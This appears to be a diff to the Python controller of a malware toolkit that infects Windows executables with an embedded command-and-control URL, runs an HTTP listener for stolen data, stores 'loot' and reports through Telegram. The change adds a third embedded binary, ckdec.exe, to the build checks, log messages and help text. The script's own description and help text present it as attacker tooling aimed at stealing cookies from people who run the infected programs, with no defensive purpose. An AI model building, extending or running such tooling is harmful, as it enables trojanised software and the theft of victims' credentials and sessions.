@@ -38,7 +38,7 @@ Output structure:
       apps/    <- standalone infected exes (no folder dependencies)
 
 What it does:
-    1. Checks if loader.exe + ckdll.dll exist; if not, runs build.bat
+    1. Checks if loader.exe + ckdll.dll + ckdec.exe exist; if not, runs build.bat
     2. Detects attacker's local IP for C2 URL
     3. Starts listen.py in background (HTTP listener)
     4. Infects the .exe with the embedded C2 URL
@@ -57,6 +57,7 @@ HERE   = os.path.dirname(os.path.abspath(__file__))
 BIN    = os.path.join(HERE, "bin")
 LOADER = os.path.join(BIN, "loader.exe")
 DLL    = os.path.join(BIN, "ckdll.dll")
+CKDEC  = os.path.join(BIN, "ckdec.exe")     # embedded in loader.exe at build time
 LOOT   = os.path.join(HERE, "loot")
 IFEC   = os.path.join(HERE, "ifec")
 IFEC_FOLDS = os.path.join(IFEC, "folds")
@@ -416,15 +417,15 @@ def _compiler_ready():
     return False, info
 
 def ensure_build():
-    """Build loader.exe + ckdll.dll if they don't exist."""
-    if os.path.isfile(LOADER) and os.path.isfile(DLL):
+    """Build loader.exe + ckdll.dll + ckdec.exe if they don't exist."""
+    if all(os.path.isfile(p) for p in (LOADER, DLL, CKDEC)):
         log("[+] binaries already compiled")
         return True
     if sys.platform != "win32":
         # MSVC + build.bat are Windows-only: on Linux the attacker machine uses the
         # prebuilt binaries shipped in bin/ (infection itself is a byte append)
         log("[-] no prebuilt binaries in bin/ and compilation needs Windows (MSVC)")
-        log("    copy bin/loader.exe + bin/ckdll.dll from a Windows build machine")
+        log("    copy bin/loader.exe + bin/ckdll.dll + bin/ckdec.exe from a Windows build machine")
         return False
     if not os.path.isfile(BUILD):
         log("[-] build.bat not found")
@@ -433,7 +434,7 @@ def ensure_build():
     if not ok:
         log("[-] no usable C++ toolchain: %s" % info)
         log("    install Visual Studio Build Tools -> 'Desktop development with C++'")
-        log("    (or copy prebuilt bin/loader.exe + bin/ckdll.dll from another machine)")
+        log("    (or copy prebuilt bin/loader.exe + bin/ckdll.dll + bin/ckdec.exe from another machine)")
         return False
     log("[*] building binaries with MSVC %s (needs a minute)..." % info)
     try:
@@ -1377,7 +1378,7 @@ def print_help():
     log("    tg-chatid <token>     Find your Telegram chat ID")
     log("")
     log("  BUILD / TEST:")
-    log("    build                 Compile loader.exe + ckdll.dll (needs MSVC)")
+    log("    build                 Compile loader.exe + ckdll.dll + ckdec.exe (needs MSVC)")
     log("    install               Run install.bat (dependency installer)")
     log("    test-listener         Start listener + send fake cookies (verify it works)")
     log("")
